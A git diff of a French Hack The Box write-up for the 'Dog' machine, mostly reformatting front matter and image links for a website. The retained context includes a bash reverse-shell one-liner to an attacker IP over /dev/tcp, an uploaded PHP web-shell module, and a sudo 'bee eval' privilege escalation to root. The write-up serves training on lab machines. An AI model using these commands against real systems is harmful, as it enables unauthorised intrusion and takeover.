@@ -1,26 +1,24 @@
 ---
+layout: writeup
 title: Dog
 description: wouf wouf?
-tags:
-  - HTB
-  - machine
-  - reuse
-  - bee
-  - git
-  - sql
+excerpt: wouf wouf?
 date: 2026-04-12T15:47
-tasks:
-  - format
-parent file:
-  - "[[HTB MOC]]"
+platform: htb
+permalink: /writeups/htb/season7/dog/
 os: linux
 difficulty: easy
-category:
-  - writeups
-  - htb
-season: "7"
-seasonal: no
+season: '7'
+tags:
+- HTB
+- linux
+- easy
+prev_url: /writeups/htb/season7/nocturnal/
+next_url: /writeups/htb/season7/titanic/
 ---
+
+{% raw %}
+
 # Outline
 ## Foothold
 - La page `.git/` est accessible au public.
@@ -36,10 +34,10 @@ seasonal: no
 Il est possible de voir les ports ouverts `22` et `80`. 
 
 Avec bien sûr un site sur le port 80.
-![[Pasted image 20260412162622.png]]
+<img class="content-image" src="/assets/content/htb/season7-dog/Pasted%20image%2020260412162622.png" alt="Dog" loading="lazy">
 
 L'énumération ffuf montre quelques pages intéressantes mais une sort du lot:
-![[Pasted image 20260413112827.png]]
+<img class="content-image" src="/assets/content/htb/season7-dog/Pasted%20image%2020260413112827.png" alt="Dog" loading="lazy">
 
 git-dumper permet de récupérer tout ce dossier avec une simple commande:
 ```
@@ -110,7 +108,7 @@ tar -cvzf shell.tar.gz shell
 alors il est possible d'upload ce dossier tar sur le site web en tant que module et d'y accéder ensuite via l'url suivant
 ``
 Après avoir upload ce module, il est accessible directement à `/modules/shell/shell.php`.
-![[Pasted image 20260413162734.png]]
+<img class="content-image" src="/assets/content/htb/season7-dog/Pasted%20image%2020260413162734.png" alt="Dog" loading="lazy">
 
 (attention il faut aller vite et ne pas ouvrir d'autre page sinon le module disparaît...)
 
@@ -119,7 +117,7 @@ Ce shell permet de s'envoyer un reverse shell sur son pc.
 /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.15.23/4444 0>&1'
 ```
 
-![[Pasted image 20260413163014.png]]
+<img class="content-image" src="/assets/content/htb/season7-dog/Pasted%20image%2020260413163014.png" alt="Dog" loading="lazy">
 
 # Privilege Escalation to user
 
@@ -128,7 +126,7 @@ Le mot de passe de l'utilisateur est à nouveau réutilisé pour l'utilisateur `
 # PrivEsc to root
 
 L'utilisateur `johncusack` a accès à une commande avec sudo:
-![[Pasted image 20260413165320.png]]
+<img class="content-image" src="/assets/content/htb/season7-dog/Pasted%20image%2020260413165320.png" alt="Dog" loading="lazy">
 
 ```
 Matching Defaults entries for johncusack on dog:
@@ -149,6 +147,7 @@ sudo /usr/local/bin/bee --root=/var/www/html eval 'system("cp /bin/bash /tmp/roo
 ```
 
 Et voilà comment obtenir un terminal root!
-![[Pasted image 20260413212145.png]]
+<img class="content-image" src="/assets/content/htb/season7-dog/Pasted%20image%2020260413212145.png" alt="Dog" loading="lazy">
 
-![[Pasted image 20260413212223.png]]
+<img class="content-image" src="/assets/content/htb/season7-dog/Pasted%20image%2020260413212223.png" alt="Dog" loading="lazy">
+{% endraw %}
